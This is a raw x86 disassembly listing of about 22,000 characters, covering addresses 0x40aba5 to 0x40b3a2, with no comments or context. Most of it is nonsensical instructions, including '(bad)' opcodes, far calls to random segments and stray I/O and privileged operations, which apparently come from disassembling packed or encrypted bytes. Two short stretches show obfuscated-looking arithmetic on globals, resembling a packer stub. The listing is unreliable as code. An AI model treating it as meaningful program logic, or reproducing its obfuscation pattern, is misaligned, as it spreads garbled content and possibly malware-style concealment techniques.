  40aba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aba6:	dec    ecx
  40aba7:	pushf  
  40aba8:	ss xchg edx,eax
  40abaa:	ds push ebp
  40abac:	mov    esi,0x98a8d85d
  40abb1:	add    eax,0x1036b797
  40abb6:	out    dx,eax
  40abb7:	dec    ecx
  40abb8:	fdivr  DWORD PTR [ebx]
  40abba:	test   BYTE PTR [edx-0x7a],al
  40abbd:	aad    0xe9
  40abbf:	and    BYTE PTR [edx],ch
  40abc1:	loope  0x40abc5
  40abc3:	inc    ebx
  40abc4:	push   es
  40abc5:	iret   
  40abc6:	sub    dh,BYTE PTR [esi+0x6539fec4]
  40abcc:	in     al,0x29
  40abce:	in     al,0x51
  40abd0:	call   FWORD PTR [edx+0xd]
  40abd3:	dec    esi
  40abd4:	das    
  40abd5:	mov    bh,0xa5
  40abd7:	xor    dh,cl
  40abd9:	dec    esp
  40abda:	push   0xffffffe9
  40abdc:	jns    0x40abe5
  40abde:	dec    edx
  40abdf:	aad    0x0
  40abe1:	pop    ss
  40abe2:	xchg   ecx,eax
  40abe3:	pop    ebp
  40abe4:	lea    ebp,[edx]
  40abe6:	adc    al,dl
  40abe8:	dec    ebx
  40abe9:	mov    ecx,0xe0c6ed99
  40abee:	and    edx,edi
  40abf0:	ins    DWORD PTR es:[edi],dx
  40abf1:	push   es
  40abf2:	test   al,0x16
  40abf4:	mov    al,BYTE PTR [eax]
  40abf6:	mov    cl,0x5e
  40abf8:	test   eax,0x8dac862c
  40abfd:	inc    esi
  40abfe:	aam    0x97
  40ac00:	push   0xf78c1132
  40ac05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac06:	in     eax,dx
  40ac07:	adc    BYTE PTR [edi+esi*1],dh
  40ac0a:	add    edi,DWORD PTR [esp+ebx*4+0x4f]
  40ac0e:	or     DWORD PTR [edx+0x1498ce0e],edx
  40ac14:	gs rcl esp,0x4b
  40ac18:	js     0x40ac33
  40ac1a:	out    dx,eax
  40ac1b:	push   0x260e6760
  40ac20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac21:	pop    ebp
  40ac22:	pop    edi
  40ac23:	inc    cx
  40ac25:	iret   
  40ac26:	or     DWORD PTR [edi],ebp
  40ac28:	sbb    ah,BYTE PTR [edx]
  40ac2a:	inc    esi
  40ac2b:	xor    esp,ebp
  40ac2d:	and    eax,0xcefcef45
  40ac32:	out    0x1a,al
  40ac34:	loop   0x40ac4d
  40ac36:	imul   ebp,ecx,0x3124d189
  40ac3c:	jp     0xa63d
  40ac41:	sub    ah,dh
  40ac43:	popa   
  40ac44:	xchg   ebx,eax
  40ac45:	out    0xed,al
  40ac47:	pop    esi
  40ac48:	push   cs
  40ac49:	fnstsw WORD PTR ds:0xddc50bbe
  40ac4f:	pop    es
  40ac50:	iret   
  40ac51:	sbb    DWORD PTR [ebx+ebx*8-0x49],0x3a3359df
  40ac59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac5a:	and    al,0xc4
  40ac5c:	mov    bh,0x51
  40ac5e:	xchg   BYTE PTR [ecx],bl
  40ac60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac61:	xchg   ecx,eax
  40ac62:	leave  
  40ac63:	leave  
  40ac64:	out    dx,al
  40ac65:	rol    al,cl
  40ac67:	pop    ss
  40ac68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac69:	call   0x91e1:0x404e306b
  40ac70:	ret    
  40ac71:	hlt    
  40ac72:	bswap  eax
  40ac74:	lods   al,BYTE PTR ds:[esi]
  40ac75:	add    BYTE PTR [edi],0x59
  40ac78:	xor    al,0xc4
  40ac7a:	stc    
  40ac7b:	jbe    0x40ac94
  40ac7d:	cmp    eax,0x5c40e12c
  40ac82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac83:	lds    eax,FWORD PTR [ecx-0x11f81e66]
  40ac89:	fisubr WORD PTR [eax+0x2f]
  40ac8c:	shl    BYTE PTR [ebx],1
  40ac8e:	dec    edi
  40ac8f:	mov    WORD PTR [ecx+ecx*2],gs
  40ac92:	and    eax,0xcf73e2cc
  40ac97:	fidivr WORD PTR [edx-0x3e]
  40ac9a:	sti    
  40ac9b:	push   edx
  40ac9c:	dec    edi
  40ac9d:	lock aas 
  40ac9f:	xchg   esi,eax
  40aca0:	jl     0x40ac8a
  40aca2:	mov    bh,0x9c
  40aca4:	scas   eax,DWORD PTR es:[edi]
  40aca5:	ja     0x40ac3f
  40aca7:	dec    ebp
  40aca8:	inc    ecx
  40aca9:	dec    eax
  40acaa:	ja     0x40acfc
  40acac:	loopne 0x40ad1d
  40acae:	jmp    0x40ac7b
  40acb0:	retf   
  40acb1:	adc    DWORD PTR [edx],0xdc4a13ef
  40acb7:	sbb    ch,BYTE PTR [ecx+edx*1+0xcd96dfb]
  40acbe:	cdq    
  40acbf:	cs push 0xffffff81
  40acc2:	jg     0x40ad20
  40acc4:	loop   0x40ad34
  40acc6:	inc    edx
  40acc7:	mov    ds:0xe4346254,eax
  40accc:	jne    0x40ad3d
  40acce:	mov    esi,0x319a2011
  40acd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acd4:	push   cs
  40acd5:	push   cs
  40acd6:	pop    eax
  40acd7:	adc    DWORD PTR [eax+0x61c8367c],edi
  40acdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acde:	jle    0x40acbc
  40ace0:	icebp  
  40ace1:	push   edx
  40ace2:	add    al,0xa6
  40ace4:	mov    edx,0xf78d6eb4
  40ace9:	(bad)  
  40acea:	stc    
  40aceb:	popa   
  40acec:	lods   al,BYTE PTR ds:[esi]
  40aced:	mov    esp,0x737695ca
  40acf2:	push   es
  40acf3:	sub    edx,DWORD PTR [ecx]
  40acf5:	pop    ss
  40acf6:	mov    dh,cl
  40acf8:	xchg   BYTE PTR [edi],bl
  40acfa:	add    BYTE PTR [ebx+0x4a],ah
  40acfd:	fidivr DWORD PTR [esi+0x7373b834]
  40ad03:	ds push edx
  40ad05:	dec    esi
  40ad06:	dec    esp
  40ad07:	sub    DWORD PTR [edx],ecx
  40ad09:	xchg   ecx,esi
  40ad0b:	add    ebx,DWORD PTR [eax-0x44]
  40ad0e:	(bad)  [eiz*2-0x75174f63]
  40ad15:	adc    al,0xab
  40ad17:	or     esi,DWORD PTR [ebx]
  40ad19:	rcr    BYTE PTR [esi],0xaf
  40ad1c:	mov    esi,0x7a85f0d1
  40ad21:	ja     0x40ad61
  40ad23:	adc    ebx,DWORD PTR [ebx]
  40ad25:	ins    BYTE PTR es:[edi],dx
  40ad26:	mov    dl,0x41
  40ad28:	mov    ds:0xfd2d94d3,al
  40ad2d:	mov    DWORD PTR [esi],ecx
  40ad2f:	push   ebx
  40ad30:	xchg   edx,eax
  40ad31:	jnp    0x40ad18
  40ad33:	fstp   DWORD PTR [ecx+0x7beddd03]
  40ad39:	jmp    0x40ad75
  40ad3b:	in     al,0xdb
  40ad3d:	lods   al,BYTE PTR ds:[esi]
  40ad3e:	push   ds
  40ad3f:	stos   BYTE PTR es:[edi],al
  40ad40:	imul   eax,DWORD PTR [esi*1+0x1b1cc66],0x18704875
  40ad4b:	inc    eax
  40ad4c:	adc    esp,DWORD PTR [edx-0x82210ed]
  40ad52:	mov    WORD PTR [edi],fs
  40ad54:	fwait
  40ad55:	ud2    
  40ad57:	(bad)  
  40ad58:	and    al,cl
  40ad5a:	push   ds
  40ad5b:	mov    bl,0x82
  40ad5d:	xor    esi,ecx
  40ad5f:	jo     0x40ad34
  40ad61:	mov    dl,0xa2
  40ad63:	pop    edx
  40ad64:	mov    fs,edi
  40ad66:	gs retf 0xb540
  40ad6a:	aas    
  40ad6b:	jmp    0x40ada6
  40ad6d:	mov    eax,0xd95954c7
  40ad72:	pop    es
  40ad73:	sub    bh,BYTE PTR gs:[eax+ebp*4-0x5692aa89]
  40ad7b:	fisttp DWORD PTR [edi-0x6e82677c]
  40ad81:	mov    dh,0x9c
  40ad83:	je     0x40ad83
  40ad85:	fidiv  WORD PTR [esi+0x72776424]
  40ad8b:	hlt    
  40ad8c:	ret    
  40ad8d:	pop    edi
  40ad8e:	cmp    al,BYTE PTR [ecx+0x8]
  40ad91:	ins    BYTE PTR es:[edi],dx
  40ad92:	adc    BYTE PTR [ecx+0x3b],bh
  40ad95:	inc    eax
  40ad96:	popf   
  40ad97:	pop    ds
  40ad98:	dec    ebp
  40ad99:	(bad)  
  40ad9a:	fwait
  40ad9b:	inc    esp
  40ad9c:	xor    eax,0xf8d0d218
  40ada1:	sar    bl,0x29
  40ada4:	mov    bl,0xcd
  40ada6:	test   eax,0xdeb32142
  40adab:	std    
  40adac:	mov    ebx,0x401b1fe3
  40adb1:	mov    bh,0xc1
  40adb3:	fsub   DWORD PTR [ebx+0x41]
  40adb6:	xor    DWORD PTR [ebx+0x14149aad],edx
  40adbc:	xlat   BYTE PTR ds:[ebx]
  40adbd:	cmc    
  40adbe:	fidivr WORD PTR [edx-0x327f32f2]
  40adc4:	sbb    DWORD PTR [edx+0x37],ebx
  40adc7:	sub    esp,DWORD PTR [edx*1-0x1bfe25e1]
  40adce:	xchg   ah,dl
  40add0:	aaa    
  40add1:	push   cs
  40add2:	xor    BYTE PTR [ecx],ah
  40add4:	cmp    edi,esp
  40add6:	pop    ebx
  40add7:	mov    ds:0xe6df81a7,al
  40addc:	pop    ss
  40addd:	add    eax,0xb0858739
  40ade2:	hlt    
  40ade3:	xlat   BYTE PTR ds:[ebx]
  40ade4:	mov    ch,0x5
  40ade6:	cmp    eax,0x71d6a455
  40adeb:	not    BYTE PTR [esi-0x32d06545]
  40adf1:	push   ebx
  40adf2:	icebp  
  40adf3:	push   DWORD PTR [edi-0x72]
  40adf6:	and    ebp,0xfffffff4
  40adf9:	fwait
  40adfa:	dec    esp
  40adfb:	mov    eax,ds:0xdc4b1158
  40ae00:	inc    esi
  40ae01:	dec    ecx
  40ae02:	pop    ebp
  40ae03:	and    BYTE PTR [ebp-0xf],dh
  40ae06:	adc    al,0xc4
  40ae08:	hlt    
  40ae09:	cmp    eax,0xdbd8cdb0
  40ae0e:	sbb    BYTE PTR [edi+0x2f],0x28
  40ae12:	dec    ebp
  40ae13:	fcom   DWORD PTR [ebx-0x1e]
  40ae16:	shl    DWORD PTR [eax+0x5b],1
  40ae19:	jl     0x40adef
  40ae1b:	test   al,0x40
  40ae1d:	loop   0x40ae59
  40ae1f:	sub    eax,0xe0b48838
  40ae24:	pop    edx
  40ae25:	xchg   edx,eax
  40ae26:	inc    edi
  40ae27:	(bad)  
  40ae28:	and    al,0xb8
  40ae2a:	jb     0x40addc
  40ae2c:	cmp    BYTE PTR [eax],bh
  40ae2e:	and    edi,edi
  40ae30:	std    
  40ae31:	into   
  40ae32:	inc    esi
  40ae33:	pusha  
  40ae34:	adc    al,0x9e
  40ae36:	daa    
  40ae37:	popf   
  40ae38:	inc    ebp
  40ae39:	xor    al,bh
  40ae3b:	lods   al,BYTE PTR ds:[esi]
  40ae3c:	pop    edx
  40ae3d:	mov    cl,0x89
  40ae3f:	push   ebp
  40ae40:	adc    BYTE PTR [edx+esi*1],ah
  40ae43:	push   es
  40ae44:	adc    DWORD PTR [esi-0x38f7635e],ecx
  40ae4a:	inc    ebp
  40ae4b:	loopne 0x40ae10
  40ae4d:	outs   dx,BYTE PTR ds:[esi]
  40ae4e:	add    BYTE PTR [eax],al
  40ae50:	xor    ecx,0x7405
  40ae56:	push   esi
  40ae57:	mov    DWORD PTR [ebp-0x1c],0x2a74
  40ae5e:	mov    DWORD PTR [ebp-0x10],0x2e2c
  40ae65:	push   0x5285
  40ae6a:	xor    ecx,0x324d
  40ae70:	mov    DWORD PTR [ebp-0xc],0x3d0a
  40ae77:	sbb    eax,ecx
  40ae79:	mov    eax,DWORD PTR [ebp-0x10]
  40ae7c:	cmp    DWORD PTR ds:0x4282eb,0x0
  40ae83:	mov    ecx,DWORD PTR ds:0x4282b3
  40ae89:	mov    ecx,0x7ccc
  40ae8e:	jmp    0x40af01
  40ae93:	mov    DWORD PTR ds:0x4283e7,edx
  40ae99:	movzx  ecx,BYTE PTR ds:0x4282cb
  40aea0:	cmp    DWORD PTR ds:0x4282eb,0x0
  40aea7:	ja     0x40aee7
  40aead:	push   0x309a
  40aeb2:	push   DWORD PTR [ebp-0x1c]
  40aeb5:	push   DWORD PTR [ebp-0x14]
  40aeb8:	push   0x42811b
  40aebd:	call   DWORD PTR ds:0x428ed8
  40aec3:	mov    ecx,DWORD PTR ds:0x42836b
  40aec9:	xor    DWORD PTR ds:0x42828f,ecx
  40aecf:	or     DWORD PTR ds:0x4283db,ecx
  40aed5:	or     DWORD PTR ds:0x4282f3,ecx
  40aedb:	mov    ecx,DWORD PTR ds:0x4282ff
  40aee1:	adc    DWORD PTR ds:0x4282c7,ecx
  40aee7:	xor    ecx,ecx
  40aee9:	or     ecx,DWORD PTR ds:0x4281c3
  40aeef:	adc    ecx,DWORD PTR ds:0x4283e7
  40aef5:	mov    DWORD PTR ds:0x4281c3,ecx
  40aefb:	and    ecx,0x2e4b
  40af01:	mov    ecx,DWORD PTR [ebp-0xc]
  40af04:	push   0x712c
  40af09:	adc    DWORD PTR ds:0x4283e3,0x428357
  40af13:	push   ecx
  40af14:	and    DWORD PTR ds:0x4281c3,0x72a4
  40af1e:	jmp    0x40b314
  40af23:	xchg   ecx,eax
  40af24:	sahf   
  40af25:	push   0x5e4f260e
  40af2a:	push   ds
  40af2b:	(bad)  
  40af2c:	fist   WORD PTR [edi-0x56]
  40af2f:	jecxz  0x40aef2
  40af31:	stos   DWORD PTR es:[edi],eax
  40af32:	mov    al,0xb5
  40af34:	sbb    ebx,DWORD PTR [eax]
  40af36:	sbb    BYTE PTR [esi+0x12],ch
  40af39:	sbb    BYTE PTR [eax],bl
  40af3b:	cwde   
  40af3c:	mov    ebp,0xbace3164
  40af41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af42:	stos   DWORD PTR es:[edi],eax
  40af43:	inc    ecx
  40af44:	fisub  DWORD PTR [eax]
  40af46:	fdivr  DWORD PTR [ebp-0x5c55bf61]
  40af4c:	loope  0x40af29
  40af4e:	shl    bh,cl
  40af50:	mov    eax,ds:0xe1c55703
  40af55:	jne    0x40afb2
  40af57:	xor    BYTE PTR [eax+eax*4+0x18a857d8],ch
  40af5e:	and    eax,0x8f1ac48f
  40af63:	sar    BYTE PTR [edi-0x37],cl
  40af66:	jbe    0x40afae
  40af68:	pop    es
  40af69:	hlt    
  40af6a:	js     0x40af39
  40af6c:	dec    ax
  40af6e:	xchg   BYTE PTR [esi-0x34e39dc4],dl
  40af74:	and    ch,bh
  40af76:	data16 adc al,0x90
  40af79:	sti    
  40af7a:	add    BYTE PTR [eax],dh
  40af7c:	sbb    ch,BYTE PTR [edi]
  40af7e:	xor    eax,0x75f72cbe
  40af83:	lahf   
  40af84:	scas   eax,DWORD PTR es:[edi]
  40af85:	adc    DWORD PTR [edx+0x2b],esp
  40af88:	add    esi,ebp
  40af8a:	mov    ecx,DWORD PTR [ebx-0x63f5eb6d]
  40af90:	inc    esi
  40af91:	mov    dl,0x8b
  40af93:	sti    
  40af94:	and    eax,edi
  40af96:	sub    BYTE PTR [eax-0x2e1933f],bl
  40af9c:	jp     0x40afe4
  40af9e:	test   ch,cl
  40afa0:	dec    BYTE PTR [ecx-0x7d]
  40afa3:	add    BYTE PTR [edx],ch
  40afa5:	enter  0x75c8,0xb2
  40afa9:	or     ah,BYTE PTR [edi-0x56]
  40afac:	ficom  WORD PTR [ecx]
  40afae:	mov    bl,0x3
  40afb0:	icebp  
  40afb1:	sti    
  40afb2:	data16 cld 
  40afb4:	xchg   BYTE PTR [ecx+0x48344447],bh
  40afba:	cmp    BYTE PTR [esi-0xfbf24e4],0x8a
  40afc1:	icebp  
  40afc2:	xor    al,0x4b
  40afc4:	and    eax,0x8af53966
  40afc9:	jg     0xf27dc6e0
  40afcf:	push   cs
  40afd0:	pop    edi
  40afd1:	jno    0x40afc1
  40afd3:	xchg   ecx,eax
  40afd4:	out    dx,eax
  40afd5:	mov    DWORD PTR [edx+0x7e227502],edi
  40afdb:	inc    esp
  40afdc:	ins    BYTE PTR es:[edi],dx
  40afdd:	in     eax,dx
  40afde:	inc    edi
  40afdf:	xchg   BYTE PTR [eax],al
  40afe1:	test   BYTE PTR [ebp-0x5507ad26],cl
  40afe7:	mov    fs:0xdeb8cdc,al
  40afed:	or     dh,BYTE PTR [edi*4+0x721def5e]
  40aff4:	std    
  40aff5:	and    BYTE PTR [edx+0x3f],al
  40aff8:	(bad)  
  40aff9:	sub    eax,0x6455c5b
  40affe:	adc    bh,BYTE PTR [ecx-0x2e]
  40b001:	or     eax,0x80b45fb5
  40b006:	rcr    DWORD PTR [edx-0x59],1
  40b009:	pop    ebx
  40b00a:	mov    dl,0x8
  40b00c:	add    edx,ebx
  40b00e:	jnp    0x40b037
  40b010:	or     DWORD PTR [edx+0x41],esp
  40b013:	adc    DWORD PTR [ebx],eax
  40b015:	out    0x51,eax
  40b017:	test   al,0xf0
  40b019:	inc    edi
  40b01a:	popf   
  40b01b:	hlt    
  40b01c:	and    ebp,DWORD PTR [ecx+0x474f318b]
  40b022:	out    dx,eax
  40b023:	retf   
  40b024:	dec    esi
  40b025:	mov    al,ds:0xccd34874
  40b02a:	jne    0x40b063
  40b02c:	jmp    0x3677bc37
  40b031:	inc    edi
  40b032:	push   ss
  40b033:	cmp    eax,0x4185d3d7
  40b038:	mov    ds:0x3c5761f8,eax
  40b03d:	hlt    
  40b03e:	aad    0x2c
  40b040:	fdivr  st,st(4)
  40b042:	sbb    al,0xfe
  40b044:	mov    al,0x46
  40b046:	loope  0x40afcd
  40b048:	sbb    eax,0x4857a0eb
  40b04d:	mov    fs,WORD PTR [edx]
  40b04f:	jnp    0x40b097
  40b051:	xchg   edx,eax
  40b052:	repz jmp 0xd6b0:0x1b202e1
  40b05a:	push   ecx
  40b05b:	out    0x70,eax
  40b05d:	push   ss
  40b05e:	das    
  40b05f:	sahf   
  40b060:	mov    edi,0x5f569615
  40b065:	test   DWORD PTR [edx-0x7e5017bc],ebx
  40b06b:	shr    BYTE PTR [edi+0x2450580e],1
  40b071:	dec    esp
  40b072:	or     esp,DWORD PTR [ecx]
  40b074:	or     eax,0x6791a1fa
  40b079:	and    ah,BYTE PTR [edx]
  40b07b:	cld    
  40b07c:	loopne 0x40b0d2
  40b07e:	inc    ebx
  40b07f:	mov    eax,0xb42fee3
  40b084:	xor    ebp,eax
  40b086:	xchg   DWORD PTR [esi+0x46],edx
  40b089:	nop
  40b08a:	mov    dl,0xdd
  40b08c:	lds    ecx,FWORD PTR [eax]
  40b08e:	push   ecx
  40b08f:	(bad)  
  40b090:	es push 0xb
  40b093:	out    dx,eax
  40b094:	into   
  40b095:	or     esp,ebp
  40b097:	int    0x64
  40b099:	aam    0x4
  40b09b:	outs   dx,DWORD PTR ds:[esi]
  40b09c:	add    DWORD PTR [edi+ebp*4-0x3b28cc79],esp
  40b0a3:	std    
  40b0a4:	jnp    0x40b106
  40b0a6:	aas    
  40b0a7:	sahf   
  40b0a8:	inc    edi
  40b0a9:	fidiv  DWORD PTR [edx]
  40b0ab:	sub    eax,0xfeb23f77
  40b0b0:	xchg   esp,eax
  40b0b1:	cmc    
  40b0b2:	cmp    dl,BYTE PTR ds:0x7ef5173c
  40b0b8:	ret    
  40b0b9:	mov    ebp,0x65aad4f7
  40b0be:	(bad)  [edi]
  40b0c0:	mov    eax,0x60335fd9
  40b0c5:	retf   0x532a
  40b0c8:	and    DWORD PTR [eax-0x6f08a929],0x9f101307
  40b0d2:	rol    ch,1
  40b0d4:	nop
  40b0d5:	mov    ah,BYTE PTR [esi+eax*1]
  40b0d8:	loopne 0x40b071
  40b0da:	and    eax,0x3102a9f2
  40b0df:	mov    ebp,0xc2e661b0
  40b0e4:	xor    eax,0xe6b8a39b
  40b0e9:	adc    BYTE PTR [ebx-0x688d02a5],bl
  40b0ef:	imul   BYTE PTR [ecx+0x51]
  40b0f2:	sahf   
  40b0f3:	ds inc ecx
  40b0f5:	mov    bh,0x3e
  40b0f7:	mov    bh,0xf1
  40b0f9:	out    dx,eax
  40b0fa:	mov    ebp,0xfaec76b6
  40b0ff:	jge    0x40b16a
  40b101:	outs   dx,BYTE PTR ds:[esi]
  40b102:	stos   BYTE PTR es:[edi],al
  40b103:	xor    esp,ebx
  40b105:	lock cmp esi,ecx
  40b108:	and    eax,0xca64284
  40b10d:	mov    ds:0x9419264a,al
  40b112:	bound  ecx,QWORD PTR [esi]
  40b114:	into   
  40b115:	(bad)  [edi-0xc2848b3]
  40b11b:	or     BYTE PTR ds:0xce37e080,0xa6
  40b122:	js     0x40b0bd
  40b124:	daa    
  40b125:	sbb    edi,DWORD PTR [ebx]
  40b127:	inc    ebp
  40b128:	sbb    ecx,ecx
  40b12a:	sti    
  40b12b:	repnz rcr DWORD PTR [ebp+0x53f96ef7],cl
  40b132:	xchg   edx,eax
  40b133:	fidivr WORD PTR ds:0xa296abb6
  40b139:	arpl   cx,di
  40b13b:	out    dx,al
  40b13c:	inc    eax
  40b13d:	and    DWORD PTR [esi-0x7a],esp
  40b140:	cmp    al,0xe5
  40b142:	gs push eax
  40b144:	scas   al,BYTE PTR es:[edi]
  40b145:	lock loopne 0x40b10a
  40b148:	fisttp WORD PTR [edx+0x6fae949d]
  40b14e:	pop    esi
  40b14f:	pusha  
  40b150:	in     al,dx
  40b151:	xchg   esp,eax
  40b152:	dec    ebp
  40b153:	imul   ecx,ebx,0xffffffa4
  40b156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b157:	inc    eax
  40b158:	and    cl,BYTE PTR [edi+0x53]
  40b15b:	popa   
  40b15c:	dec    ebx
  40b15d:	pop    ecx
  40b15e:	push   eax
  40b15f:	daa    
  40b160:	aaa    
  40b161:	sbb    BYTE PTR [edi],al
  40b163:	jg     0x40b111
  40b165:	ins    BYTE PTR es:[edi],dx
  40b166:	jmp    0x3d81:0x71f8dc59
  40b16d:	outs   dx,DWORD PTR ds:[esi]
  40b16e:	aad    0xc1
  40b170:	fsub   QWORD PTR [eiz*4-0x126942b2]
  40b177:	fistp  DWORD PTR [eax]
  40b179:	jecxz  0x40b1bc
  40b17b:	xchg   DWORD PTR [ebp-0x73],eax
  40b17e:	mov    esp,DWORD PTR [ecx+0x75ec471e]
  40b184:	jbe    0x40b108
  40b186:	inc    eax
  40b187:	pop    eax
  40b188:	dec    esp
  40b189:	xchg   ecx,eax
  40b18a:	add    BYTE PTR [ebp+0x24],al
  40b18d:	jle    0x40b177
  40b18f:	aam    0xfa
  40b191:	add    dl,0x25
  40b194:	neg    DWORD PTR [ebp+ebp*2+0x69]
  40b198:	hlt    
  40b199:	inc    DWORD PTR [ebp+0x59326f5b]
  40b19f:	push   esp
  40b1a0:	pusha  
  40b1a1:	jbe    0x40b187
  40b1a3:	or     eax,0xf6168be2
  40b1a8:	and    DWORD PTR [edi+0x6a5d57b6],edx
  40b1ae:	or     edi,DWORD PTR [ebx+0x1af0e148]
  40b1b4:	aaa    
  40b1b5:	sbb    BYTE PTR [edx-0x77],cl
  40b1b8:	fist   DWORD PTR [ebx+esi*2-0x72bf8c29]
  40b1bf:	int    0xf5
  40b1c1:	sbb    ebp,DWORD PTR [ebp+0x12]
  40b1c4:	pop    esp
  40b1c5:	jno    0x40b21a
  40b1c7:	loopne 0x40b18d
  40b1c9:	dec    edi
  40b1ca:	fdiv   DWORD PTR [ebp+0x55be75eb]
  40b1d0:	scas   al,BYTE PTR es:[edi]
  40b1d1:	sbb    esp,DWORD PTR [eax]
  40b1d3:	cmp    dh,BYTE PTR [ebp+ecx*1-0x79309762]
  40b1da:	call   0x2634:0x31045c73
  40b1e1:	or     DWORD PTR [edx+0x51],0x664fe2f6
  40b1e8:	add    bl,BYTE PTR [eax-0x315c7346]
  40b1ee:	ror    BYTE PTR [esp+ecx*2+0x5853b893],0xea
  40b1f6:	enter  0xc448,0xfc
  40b1fa:	push   0xdee89ed7
  40b1ff:	imul   ecx,DWORD PTR [edi],0xe4d0ca43
  40b205:	fisttp DWORD PTR [ebp-0x66f7b5f1]
  40b20b:	outs   dx,BYTE PTR ds:[esi]
  40b20c:	(bad)  
  40b20d:	jle    0x40b279
  40b20f:	repz or dl,0x69
  40b213:	iret   
  40b214:	or     al,ch
  40b216:	and    dh,0xcd
  40b219:	mov    edi,0x14ab81c5
  40b21e:	dec    esi
  40b21f:	mov    cl,0x5f
  40b221:	push   esi
  40b222:	and    ebx,0xffffffef
  40b225:	mov    dh,0x97
  40b227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b228:	pop    ds
  40b229:	push   edi
  40b22a:	ja     0x40b23e
  40b22c:	mov    esi,DWORD PTR [eax]
  40b22e:	fs jo  0x40b1e0
  40b231:	ss dec esp
  40b233:	sbb    eax,0xf5ffc513
  40b238:	push   cs
  40b239:	(bad)  
  40b23b:	xlat   BYTE PTR ds:[ebx]
  40b23c:	push   edi
  40b23d:	or     ebx,DWORD PTR [edi-0x3e]
  40b240:	pop    es
  40b241:	xor    ebp,DWORD PTR [edx]
  40b243:	push   edx
  40b244:	outs   dx,BYTE PTR ds:[esi]
  40b245:	rol    BYTE PTR [ebx+0x76],1
  40b248:	leave  
  40b249:	xor    al,0x3c
  40b24b:	ficom  DWORD PTR [edx+ebx*4]
  40b24e:	fs sbb eax,0x8d9b3412
  40b254:	daa    
  40b255:	mov    ch,0x3b
  40b257:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b258:	xchg   BYTE PTR [eax+0x21eae5c7],dl
  40b25e:	test   BYTE PTR [esi],dl
  40b260:	add    ch,BYTE PTR ds:0xb8ba6080
  40b266:	pop    edx
  40b267:	idiv   DWORD PTR [edi]
  40b269:	adc    eax,0x84aea627
  40b26e:	mov    dl,0xb4
  40b270:	mov    al,ds:0x502ab8ba
  40b275:	mov    WORD PTR [bp+si-0x3d8a],gs
  40b27a:	out    dx,al
  40b27b:	mov    dh,0xc5
  40b27d:	push   0x3a
  40b27f:	jbe    0x40b29a
  40b281:	ss in  ax,dx
  40b284:	in     al,0xb5
  40b286:	mov    fs,WORD PTR [eax-0x39]
  40b289:	mov    bh,0xdd
  40b28b:	and    BYTE PTR [ebp+0x6a969633],al
  40b291:	fnstenv [eax-0x17]
  40b294:	les    ecx,FWORD PTR [eax+0xebd28ac]
  40b29a:	or     dl,BYTE PTR [edi+0x7b]
  40b29d:	push   esp
  40b29e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b29f:	lock sub eax,0xa86af81e
  40b2a5:	mov    ah,0x6e
  40b2a7:	push   cs
  40b2a8:	jne    0x40b2b9
  40b2aa:	aaa    
  40b2ab:	addr16 loop 0x40b2cc
  40b2ae:	outs   dx,DWORD PTR ds:[esi]
  40b2af:	ret    0xbf4d
  40b2b2:	stos   DWORD PTR es:[edi],eax
  40b2b3:	fs mov bl,0xb5
  40b2b6:	or     DWORD PTR [edi-0x5b],edi
  40b2b9:	and    DWORD PTR [eax],ebx
  40b2bb:	mov    ah,0xf1
  40b2bd:	fst    DWORD PTR [ebx+esi*1-0x20]
  40b2c1:	xchg   esi,eax
  40b2c2:	rcr    ebx,0xe2
  40b2c5:	add    BYTE PTR [esp+eiz*8+0x42],bh
  40b2c9:	jne    0x40b25c
  40b2cb:	jl     0x40b289
  40b2cd:	sub    eax,0xb19e61b7
  40b2d2:	test   al,0xdf
  40b2d4:	mov    esi,0x44b23f63
  40b2d9:	adc    bh,BYTE PTR [edi-0x7d]
  40b2dc:	aaa    
  40b2dd:	pushf  
  40b2de:	or     bh,BYTE PTR [ebp+0x3b3433c7]
  40b2e4:	add    al,0xe4
  40b2e6:	ja     0x40b309
  40b2e8:	and    DWORD PTR [ebx-0x5293063],ebx
  40b2ee:	fimul  DWORD PTR [ebx+ebp*8+0x7501355c]
  40b2f5:	push   es
  40b2f6:	cmp    al,0x4a
  40b2f8:	jae    0x40b340
  40b2fa:	mov    esp,0x684567cb
  40b2ff:	rol    BYTE PTR [esi+0x27e37d33],cl
  40b305:	jnp    0x40b2e0
  40b307:	imul   edi,DWORD PTR [ecx],0xffffffc4
  40b30a:	xchg   DWORD PTR [esi-0x1f],ecx
  40b30d:	jge    0x40b350
  40b30f:	push   ecx
  40b310:	test   eax,0x50d7262b
  40b315:	adc    DWORD PTR ds:0x42834b,0x428303
  40b31f:	call   0x416c20
  40b324:	sbb    esi,DWORD PTR ds:0x4282f7
  40b32a:	mov    ecx,DWORD PTR [ebp-0x20]
  40b32d:	adc    esi,0x2986
  40b333:	mov    esi,DWORD PTR [ebp-0x1c]
  40b336:	sbb    DWORD PTR ds:0x42828b,0x42834b
  40b340:	push   0x5f43
  40b345:	or     edx,0x69b4
  40b34b:	sub    DWORD PTR ds:0x4283e3,0x42834b
  40b355:	push   0x1657
  40b35a:	xor    DWORD PTR ds:0x4283cb,0x4282bf
  40b364:	or     eax,0x528b
  40b369:	xor    edx,esi
  40b36b:	xor    eax,ecx
  40b36d:	sub    DWORD PTR ds:0x4283ff,0x42829f
  40b377:	push   edx
  40b378:	push   eax
  40b379:	call   0x416c20
  40b37e:	xor    ecx,ecx
  40b380:	or     ecx,DWORD PTR ds:0x4282ff
  40b386:	adc    DWORD PTR ds:0x4281f3,ecx
  40b38c:	mov    ecx,DWORD PTR [ebp-0x28]
  40b38f:	xor    DWORD PTR ds:0x428367,ecx
  40b395:	mov    esi,DWORD PTR [ebp-0x24]
  40b398:	and    DWORD PTR ds:0x4282d3,0x4282bf
  40b3a2:	push   esi
